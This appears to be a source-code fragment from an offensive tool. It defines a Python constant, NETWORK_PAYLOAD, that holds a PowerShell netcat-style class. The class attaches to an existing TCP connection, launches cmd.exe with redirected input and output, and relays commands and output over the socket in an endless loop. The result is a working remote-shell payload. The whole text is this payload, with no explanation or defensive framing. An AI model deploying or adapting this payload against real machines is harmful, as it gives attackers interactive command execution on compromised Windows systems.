NETWORK_PAYLOAD = """class stream{[String] $Name;[IO.Stream] $IOStream;[Byte[]] $Buffer;[IAsyncResult] $AsyncResult}class pscat{[String] $Address;[String] $Port;[String] $Command;[Text.Encoding] $Encoding;[PSCustomObject] $Objects;[Object[]] $Streams;[Bool] $RedirectorPresent;pscat([String] $Address, [String] $Port){$this.Address = $Address;$this.Port = $Port;$this.Command = "";$this.Encoding = [Text.Encoding]::ASCII;$this.Objects = [PSCustomObject] @{TcpClient = $null;Process = $null};$this.Streams = @();$this.RedirectorPresent = [Console]::IsInputRedirected}[Bool] Add_TcpClient([Net.Sockets.TcpClient] $TcpClient){if($TcpClient.Connected){$this.Objects.TcpClient = $TcpClient;return $true}return $false}[Bool] Start_DiagnosticsProcess([String] $ProcessName, [String] $Arguments){$Info = [Diagnostics.ProcessStartInfo]::new();$Info.FileName = $ProcessName;$Info.Arguments = $Arguments;$Info.UseShellExecute = $false;$Info.RedirectStandardInput = $true;$Info.RedirectStandardOutput = $true;$Info.RedirectStandardError = $true;$Process = [Diagnostics.Process]::Start($Info);if(-not $Process){return $false}$this.Objects.Process = $Process;return $true}[Object[]] Start_AsyncRead([IO.Stream] $Stream){$ReadingBuffer = [Byte[]]::new(65535);$ReadingOperation = $Stream.BeginRead($ReadingBuffer, 0, $ReadingBuffer.Length, $null, $null);return $ReadingBuffer, $ReadingOperation}[Stream] Make_Stream([String] $Name, [IO.Stream] $IOStream, [Byte[]] $Buffer, [IAsyncResult] $AsyncResult){$Stream = [Stream]::new();$Stream.Name = $Name;$Stream.IOStream = $IOStream;$Stream.Buffer = $Buffer;$Stream.AsyncResult = $AsyncResult;return $Stream}[Void] Setup_Streams(){if($this.Objects.TcpClient){$IOStream = $this.Objects.TcpClient.GetStream();$ReadBuffer, $ReadOp = $this.Start_AsyncRead($IOStream);$this.Streams += $this.Make_Stream("TcpStream", $IOStream, $ReadBuffer, $ReadOp)}if($this.RedirectorPresent){$IOStream = [Console]::OpenStandardInput();$ReadBuffer, $ReadOp = $this.Start_AsyncRead($IOStream);$this.Streams += $this.Make_Stream("StdInStream", $IOStream, $ReadBuffer, $ReadOp)}if($this.Objects.Process){$IOStream = $this.Objects.Process.StandardOutput.BaseStream;$ReadBuffer, $ReadOp = $this.Start_AsyncRead($IOStream);$this.Streams += $this.Make_Stream("StdOutStream", $IOStream, $ReadBuffer, $ReadOp);$IOStream = $this.Objects.Process.StandardError.BaseStream;$ReadBuffer, $ReadOp = $this.Start_AsyncRead($IOStream);$this.Streams += $this.Make_Stream("StdErrStream", $IOStream, $ReadBuffer, $ReadOp)}}[String] Process_Streams([Int] $StreamIndex){$Stream = $this.Streams[$StreamIndex];$Data = $null;if($Stream.AsyncResult.IsCompleted){try{$Length = $Stream.IOStream.EndRead($Stream.AsyncResult)}catch{exit};if($Length -eq 0){return $null}$Data = $this.Encoding.GetString($Stream.Buffer, 0, $Length);$ReadBuffer, $ReadOp = $this.Start_AsyncRead($Stream.IOStream);$Stream = $this.Make_Stream($Stream.Name, $Stream.IOStream, $ReadBuffer, $ReadOp);$this.Streams[$StreamIndex] = $Stream}return $Data}[Void] Update_DiagnosticsProcess(){foreach($Stream in 0..2){$Data = $this.Process_Streams($Stream);$Bytes = $this.Encoding.GetBytes($Data);if($Data -eq $null){continue}if($Stream -eq 0){$this.Objects.Process.StandardInput.BaseStream.Write($Bytes, 0, $Bytes.Length);$this.Objects.Process.StandardInput.BaseStream.Flush()}else{$this.Streams[0].IOStream.Write($Bytes, 0, $Bytes.Length);$this.Streams[0].IOStream.Flush()}}}[Void] Update_Console(){$KeyPressed = [Console]::ReadKey($true);$CursorPosition = [Console]::CursorLeft;if($KeyPressed.Key -eq "Enter"){$this.Command += "`n";$RawCommand = $this.Encoding.GetBytes($this.Command);$this.Streams[0].IOStream.Write($RawCommand, 0, $RawCommand.Length);$this.Streams[0].IOStream.Flush();[Console]::WriteLine();$this.Command = ""}elseif($KeyPressed.Key -eq "Backspace"){if($this.Command.Length -gt 0){$this.Command = $this.Command.Substring(0, $this.Command.Length - 1);[Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop);[Console]::Write(" ");[Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop)}}else{$this.Command += $KeyPressed.KeyChar;[Console]::Write($KeyPressed.KeyChar)}}[Void] Update_Redirector(){$Data = $this.Process_Streams(1);if(-not $Data){return}$Bytes = $this.Encoding.GetBytes($Data);$this.Streams[0].IOStream.Write($Bytes, 0, $Bytes.Length);$this.Streams[0].IOStream.Flush()}[Void] Update_TcpConnection(){$Data = $this.Process_Streams(0);if($Data){[Console]::Write($Data)}if($this.RedirectorPresent){$this.Update_Redirector();return}if([Console]::KeyAvailable){$this.Update_Console()}}[Void] Close_Streams(){foreach($Stream in $this.Streams){$Stream.IOStream.Close()}if($this.Objects.TcpClient){$this.Objects.TcpClient.Close}if($this.Objects.Process){$this.Objects.Process.Kill()}}}$TcpClient = [pscat]::new($null, $null);$TcpClient.Add_TcpClient($t);$TcpClient.Start_DiagnosticsProcess("cmd.exe", $null);$TcpClient.Setup_Streams();while(1){$TcpClient.Update_DiagnosticsProcess()}\n"""